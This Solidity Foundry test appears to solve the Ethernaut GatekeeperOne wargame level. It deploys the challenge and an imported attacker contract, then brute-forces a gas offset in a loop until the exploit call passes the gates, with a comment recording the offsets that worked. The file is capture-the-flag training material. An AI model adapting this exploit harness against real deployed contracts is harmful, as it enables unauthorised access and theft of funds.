// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/13_GatekeeperOne.sol";
import "contracts/13_GatekeeperOne.sol";

contract AttackerGatekeeperOneTest is Test {
    function testGatekeeperOne() external {
        vm.prank(address(0x1));
        GatekeeperOne gatekeeperOne = new GatekeeperOne();
        AttackerGatekeeperOne attackerGatekeeperOne = new AttackerGatekeeperOne();

        assertFalse(gatekeeperOne.entrant() == msg.sender);
        for (uint256 i; i < 8191; i++) {
            try attackerGatekeeperOne.exploit(address(gatekeeperOne), 20000 + i, uint16(msg.sender)) {
                console.log("OK", i); // i = 7484 locally, 4769 for target network
                break;
            } catch (bytes memory) {}
        }
        assertTrue(gatekeeperOne.entrant() == msg.sender);
    }
}
